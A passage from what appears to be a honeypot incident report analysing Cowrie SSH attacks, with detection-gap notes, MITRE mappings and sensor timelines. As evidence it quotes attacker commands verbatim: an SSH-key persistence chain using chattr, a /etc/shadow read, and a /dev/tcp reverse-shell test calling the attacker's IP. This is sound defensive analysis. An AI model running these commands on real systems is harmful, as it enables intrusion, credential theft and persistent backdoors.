## 2. Detection Engineering — Updates to Previously Identified Gaps

**DG-01 refined — failed-login visibility.** The first report flagged that zero `cowrie.login.failed` events appeared in the small sample and hypothesized this was likely a decoder/rule gap. This larger sample contains only 12 `cowrie.login.failed` events out of thousands of login attempts, and on inspection, 9 of those 12 are the same session pattern (an initial auth-method negotiation failure immediately followed by a successful password login, same username, same second) rather than genuine wrong-password guesses. Only 3 events across the whole week represent an actual wrong password being rejected. This suggests the Cowrie `userdb` is configured to accept nearly any credential offered — which explains the near-total absence of failures far better than a missing decoder does. The original recommendation (add alerting for `cowrie.login.failed`) still stands for correctness, but its expected value is now understood to be low given how permissive the userdb currently is; tightening the userdb itself would be the more impactful change if realistic brute-force telemetry is the goal.

**DG-05 (new) — Cowrie's shell emulation limits what can be observed.** In IR-08 below, an attacker's `/dev/tcp` reverse-shell reachability test was logged by Cowrie as `cowrie.command.failed`, because Cowrie's bash emulation does not support that redirection syntax. This means Cowrie is honestly signaling its own limitation rather than silently succeeding — good from a "don't lie in the logs" perspective — but it also means some post-exploitation behavior (anything depending on real `/dev/tcp`, real binary execution of the uploaded RedTail samples, etc.) can never be observed past this point on this honeypot, regardless of attacker intent. This is a structural limitation of the tool, not a misconfiguration, and is worth stating explicitly for anyone reading this repo who might assume Cowrie shows the full attack lifecycle.

**DG-06 (new) — no burst/rate detection for rapid multi-session scanning.** IR-09 documents ~97 connection attempts from a single IP within a 2-second window. This was captured correctly as many individual low-severity `100500` events, but nothing in the current ruleset aggregates "many sessions from one IP in a short window" into a single higher-severity alert. An analyst watching the dashboard in real time would see a wall of level-3 noise rather than one clear "burst" signal.
**Recommendation:** add a frequency-based correlation rule (Wazuh supports this natively via `<frequency>`/`<timeframe>` on rule `100500` grouped by `srcip`) to surface connection bursts as a single elevated alert.

## 3. Incident Reports

### IR-06 — Malware Dropper Campaign: Multi-Architecture Binary Upload with SSH Persistence (130.12.180.51)

**Executive Summary**
The source IP `130.12.180.51` authenticated successfully on multiple occasions across the sample window and, on two of those occasions three-plus days apart, executed an identical multi-stage payload: it uploaded five files (four architecture-specific binaries plus two setup/cleanup shell scripts) via SFTP/SCP-style file transfer, ran a script that injects a persistent SSH key into `authorized_keys` and locks the file with the immutable attribute, then sent a hex-encoded confirmation signal. This is a materially more severe finding than anything in the first report.

**Timeline** (Cowrie sensor time, UTC)
| Time | Session | Event |
|---|---|---|
| 2026-06-25 14:27:52 | `21cc84ab83d9` | Login success `root/localhost123!` → command chain executed → 6 files uploaded → session closed |
| 2026-06-28 05:43:47 – 2026-06-30 01:43:07 | 6 sessions | Simple `admin/admin` login-and-disconnect probes, no commands (access checks) |
| 2026-06-29 02:37:49 | `e947d873aa2d` | Login success `root/Roote1234` → **identical** command chain and file set re-uploaded → session closed |

**Evidence**
- Two full executions of the same command, three-plus days apart:
  `chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAA...rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"`
  — the trailing hex string decodes to `auth_ok\n`.
- Six files uploaded to Cowrie's honeypot filesystem in both sessions, with **identical SHA-256 hashes across both occurrences** (confirming it is the same payload replayed, not a new build):

| Filename | SHA-256 |
|---|---|
| `clean.sh` | `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` |
| `setup.sh` | `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` |
| `redtail.arm7` | `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` |
| `redtail.arm8` | `dbb7ebb960dc0d5a480f97ddde3a227a2d83fcaca7d37ae672e6a0a6785631e9` |
| `redtail.i686` | `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` |
| `redtail.x86_64` | `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` |

- Six additional, simpler `admin/admin` login-only sessions from the same IP, with no follow-up commands — consistent with periodic access checks separate from the payload-delivery sessions.

**Technical Analysis**
Uploading one binary per common Linux CPU architecture (ARMv7, ARM64, i686, x86_64) without first fingerprinting the target is a standard technique for opportunistic, non-interactive botnet tooling — the dropper doesn't need to know the architecture in advance because it ships every likely option and lets `setup.sh` presumably select the right one at execution time. The `clean.sh`-then-`setup.sh`-then-delete pattern (upload, run, immediately remove the script from disk) is a straightforward anti-forensics step to reduce what's left behind for a defender to find after the fact. The `chattr -ia` / `chattr +ai` pairing around the `authorized_keys` write specifically defeats a common (weak) defense of simply deleting rogue keys, since the file is immutable even to `root` until the flag is removed again. The final hex-encoded `auth_ok` string is a machine-readable beacon, most plausibly meant to be checked by the attacker's own automation to confirm the compromise succeeded before moving that host into a botnet or reuse pool. The binary filenames (`redtail.*`) are consistent with the publicly documented **RedTail** Linux cryptojacking malware family based on naming convention alone — this has **not** been independently verified through binary analysis of the uploaded samples, since Cowrie stores only the transferred files' metadata and hash for this deployment, and no sandboxing was performed as part of this analysis.

**MITRE ATT&CK Mapping**
- T1110.001 — Password Guessing (`root/localhost123!`, `root/Roote1234`)
- T1078 — Valid Accounts
- T1105 — Ingress Tool Transfer (multi-architecture binary upload)
- T1098.004 — SSH Authorized Keys (persistence)
- T1222.002 — File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification (`chattr` immutable flag)
- T1027 — Obfuscated/Encoded Files or Information (hex-encoded confirmation signal)
- *Possible, unverified:* T1496 — Resource Hijacking (only if the binaries are confirmed cryptomining payloads; not verified here)

**Detection Gaps Identified**
No current rule distinguishes a simple credential-guessing login from a login immediately followed by multi-file upload and persistence commands — both currently generate the same generic `100500`/`100502` telemetry as routine noise, with severity only elevated for the login event itself (rule `100503`, level 10). A session that uploads files and modifies `authorized_keys` deserves materially higher severity than one that runs `echo OK` and disconnects.
**Recommendation:** add a rule that elevates severity when `cowrie.session.file_upload` occurs in the same session as a successful login, and a separate rule specifically matching `chattr` + `authorized_keys` command patterns, mapped to T1098.004.

**Assessment**
This is the most severe finding across both reports to date: a real, replayed, multi-architecture malware-dropper campaign with persistence, evasion, and C2-style confirmation — not a simple credential check. That the exact same payload (same hashes) was deployed twice, three-plus days apart, from the same source IP suggests either a persistent, semi-automated campaign against this host specifically, or (more likely given the wider pattern of automated tooling seen elsewhere in this dataset) a botnet node that periodically retries known-vulnerable-looking targets.

**Confidence Level: High** for everything directly observed (login, exact command, file hashes, timing). **Medium** for the RedTail family attribution, since it rests on filename convention rather than binary analysis.

### IR-07 — Automated Credential-Stuffing Verification Bot at Very High Volume (185.144.27.63)

**Executive Summary**
The source IP `185.144.27.63` is responsible for 1,732 of the 2,049 successful logins in this sample — a single automated tool cycling through a large list of root passwords, verifying each successful login with one fixed command, and disconnecting almost instantly.

**Evidence**
- 1,732 successful logins, always as `root`, each with a distinct password (`123456`, `zhu123456`, `19870110`, `19870410`, `19821201`, `19870910`, `19890213`, `cet333333`, and hundreds more — consistent with a leaked-password-list dictionary attack).
- Every single successful session runs exactly one command: `echo -e "\x6F\x6B"` (hex-decodes to `ok`) — 1,732 occurrences, a 1:1 match with the login count.
- Every session closes within roughly 20–400ms of the command running.
- Client fingerprint consistently `SSH-2.0-Go` across all sessions.
- One genuine failed login was also observed from this IP (`root/123456` failed once before a different password succeeded moments later), consistent with a dictionary tool moving down its list.

**Technical Analysis**
This is the clearest example in either report of a pure **credential-verification bot**: it doesn't reconnoiter, doesn't fingerprint the system, doesn't attempt persistence — it exists solely to find out which passwords work and log a fixed "ok" signal when one does, almost certainly for later hand-off to a separate exploitation stage or resale as validated access. The sheer volume (1,732 successful logins from one IP inside roughly six days) shows how effective an intentionally permissive honeypot userdb is at surfacing this kind of tooling in bulk, which is valuable for password-list intelligence but, as noted in DG-01, means this honeypot cannot be used to estimate real-world brute-force difficulty.

**MITRE ATT&CK Mapping**
- T1110.001 — Password Guessing
- T1078 — Valid Accounts
- T1059 — Command and Scripting Interpreter (minimal, verification-only)

**Assessment**
Consistent with a dedicated credential-checking tool running against a large password dictionary, most likely feeding a separate access-brokering or botnet-recruitment pipeline rather than being operated interactively.

**Confidence Level: High** — the pattern is extremely consistent (1,732 near-identical sessions) and leaves little room for alternative interpretation.

### IR-08 — Automated Multi-Stage Attack Chain: Credential Access, Infrastructure Testing, and Backdoor Deployment (156.239.42.225)

**Executive Summary**
The source IP `156.239.42.225` ran a tightly-timed, fully automated sequence across nine separate sessions within a 22-second window: it logged in with a support-account credential, attempted to read `/etc/shadow`, wrote and verified a uniquely-named test file (consistent with checking whether the host can serve as relay infrastructure), tested raw TCP reachability back to its own IP, dropped a bash reverse-shell script configured to call back to itself on port 14001, and injected a persistent SSH key. This is the most technically varied single actor observed in this dataset.

**Timeline** (Cowrie sensor time, UTC — all on 2026-06-25)
| Time | Session | Action |
|---|---|---|
| 23:54:57 | `9565f468d993` | Login `support/support` (after a failed auth-negotiation attempt) → `head -1 /etc/shadow 2>&1` |
| 23:55:00 | `90df942943b4` | Login → writes `/tmp/.pcdn_test_1782431698`, cats it back, triggers a `cowrie.session.file_download` |
| 23:55:03 | `7520bccfe2cb` | Login → re-reads the same test file |
| 23:55:06 | `1e6efb7ead8e` | Login → deletes the test file (cleanup) |
| 23:55:09 | `4e0be38b0a76` | Login → `exec 3<>/dev/tcp/156.239.42.225/9999` (TCP reachability test back to itself) — **failed**, Cowrie's shell emulation doesn't support this syntax |
| 23:55:13 | `8fbaf61aca6c` | Login → drops `/tmp/.bd.sh`, a bash reverse-shell loop calling back to `156.239.42.225:14001` every 60 seconds, launched via `nohup` |
| 23:55:16 | `2edef07052b6` | Login → injects an `ssh-ed25519` public key (comment: `kali-openclaw`) into `~/.ssh/authorized_keys` |
| 23:55:22 | `3ca6882107e4` | Final login in the sequence |

**Evidence**
- Command sequence exactly as listed above, each in its own session but chained within 22 seconds total.
- `head -1 /etc/shadow 2>&1` — a direct attempt to read the shadow password file.
- The `.pcdn_test_<number>` filename pattern (write, verify, delete) is consistent with automated tooling checking whether a compromised host is viable for reuse as relay/proxy infrastructure — comparable in spirit to the Cloudflare TURN tunneling test documented in the first report's IR-02, but here via direct filesystem read/write rather than SSH port forwarding.
- The reverse-shell script content and destination (`156.239.42.225:14001`) were both fully captured in `cowrie.command.input`.
- The injected key's comment string, `kali-openclaw`, is a literal artifact of the attacker's tooling name/environment as typed by them — reported here as an observed string, not as a confirmed attribution.

**Technical Analysis**
The 22-second total runtime across nine distinct login sessions, each performing exactly one discrete step before moving to the next, is far too fast and far too clean to be manual keyboard entry — this is a scripted post-exploitation framework working through a fixed checklist: verify credential access, check for credential material, test whether the host is useful as infrastructure, test outbound connectivity, establish a backdoor channel, and establish persistent access — in that order. The TCP reachability test failing is a Cowrie limitation (see DG-05), not a failure on the attacker's side; a real vulnerable host would very likely have let this succeed.

**MITRE ATT&CK Mapping**
- T1110.001 — Password Guessing
- T1078 — Valid Accounts
- T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow (attempted)
- T1059 — Command and Scripting Interpreter
- T1098.004 — SSH Authorized Keys (persistence)
- T1071 — Application Layer Protocol (the `/dev/tcp`-based reverse-shell channel)
- *Not clearly mapped:* the infrastructure-viability test (`.pcdn_test`) doesn't correspond cleanly to a single MITRE technique and is described here at the behavioral level rather than force-mapped.

**Detection Gaps Identified**
This entire nine-session chain would currently appear in the dashboard as nine separate, mostly low-severity events spread across less than half a minute, with no rule tying them together as one actor's continuous session despite the shared source IP and tight timing. See DG-06.

**Assessment**
This is a genuinely sophisticated, fully automated attack chain — the most varied single-actor behavior observed across both reports. The speed and precision strongly indicate a purpose-built post-exploitation tool rather than an improvised manual session.

**Confidence Level: High** for the sequence of events and their content (directly observed in full). **Medium** for the specific interpretation of the `.pcdn_test` step as an infrastructure-viability check, since Cowrie does not reveal what the attacker's tooling did with the confirmation once received.

### IR-09 — High-Volume Connection Burst Consistent with Automated Scanning/Stuffing (187.191.2.213)

**Executive Summary**
The source IP `187.191.2.213` opened 211 sessions and achieved 208 successful logins, with a striking connection burst of roughly 97 near-simultaneous connection attempts within a single second on 2026-06-30.

**Evidence**
- 211 total sessions, 208 successful logins — a ~98.6% success rate.
- Credentials spanned multiple service-style usernames beyond plain root/admin: `steam/steam123456`, `odoo/odoo`, `oracle/oracle123456`, `test/111111`, alongside conventional `root/<weak password>` pairs — consistent with a generic leaked-credential list rather than an SSH-specific wordlist.
- Client fingerprint consistently `SSH-2.0-Go` across all 211 sessions.
- Post-login command was `uname -s -v -n -r -m` (full system identification) in 91 sessions.
- Connection burst: approximately 97 new sessions opened within the single second of 03:51:27 UTC on 2026-06-30, with further bursts of 45, 38, and 31 in the adjacent seconds.

**Technical Analysis**
The mixed credential set (gaming server, ERP, database, and generic accounts) suggests this tool is not SSH-specific tooling but a generalized credential-stuffing engine reused across protocols, with SSH as one of several targets. The extremely tight connection burst — nearly 100 sessions opened within the same second — indicates the tool opens many parallel connections rather than testing sequentially, prioritizing throughput over stealth.

**MITRE ATT&CK Mapping**
- T1110.001 — Password Guessing
- T1078 — Valid Accounts
- T1082 — System Information Discovery
- T1059 — Command and Scripting Interpreter

**Detection Gaps Identified**
See DG-06 — this burst is not currently surfaced as a distinct high-severity event.

**Assessment**
Consistent with a generic, multi-protocol credential-stuffing engine operating at scale, prioritizing speed and breadth over stealth.

**Confidence Level: High** — volume, timing, and credential diversity are all directly evidenced and mutually consistent.

### IR-11 — Other Isolated Compromise Attempts (Aggregate)

**Executive Summary**
Beyond the IPs detailed above, 23 additional distinct source IPs each achieved exactly one successful login in this sample, with no further activity captured in most cases. These are grouped here rather than given individual write-ups, since the available evidence per IP is minimal (a single login event, no follow-up commands in the large majority of cases).

**Evidence**
- 23 distinct source IPs, each with exactly 1 successful login (`100503`), accounting for 23 of the 2,049 total.

**Assessment**
Consistent with low-effort, opportunistic single-shot login attempts — either abandoned after the first success (no further value seen by the tool) or truncated because the session was cut short before further action. Individually, none of these carries enough evidence to support a specific technical narrative beyond "credential guessing succeeded once."

**MITRE ATT&CK Mapping**

- T1078 — Valid Accounts

**Confidence Level: Medium** — the login events themselves are certain; the "opportunistic, low-effort" characterization is a reasonable default interpretation given the lack of any follow-up activity, not a specific finding per IP.

## 4. Cross-Incident Correlation Notes

- **IR-06's RedTail campaign was replayed identically, three-plus days apart**, using two different guessed root passwords (`localhost123!` and `Roote1234`) but uploading byte-for-byte identical files both times — the credential varies, the payload doesn't. This is consistent with a botnet's credential-guessing front-end being decoupled from its payload-delivery back-end.
- **IR-02 (first report) and IR-08 (this report) both show attackers testing whether the compromised host is useful as infrastructure** before doing anything else — one via SSH port-forwarding to Cloudflare TURN, one via direct filesystem read/write testing. Different mechanisms, same underlying behavior category: "is this host worth keeping."
- **`SSH-2.0-Go` remains the single most common client fingerprint** across both reports, appearing in credential-stuffing tooling from at least four unrelated-seeming source IPs (`185.144.27.63`, `187.191.2.213`, and others from the first report) — consistent with a widely-shared or commodity Go-based SSH client library used across multiple unrelated automated tools, not necessarily a single actor.
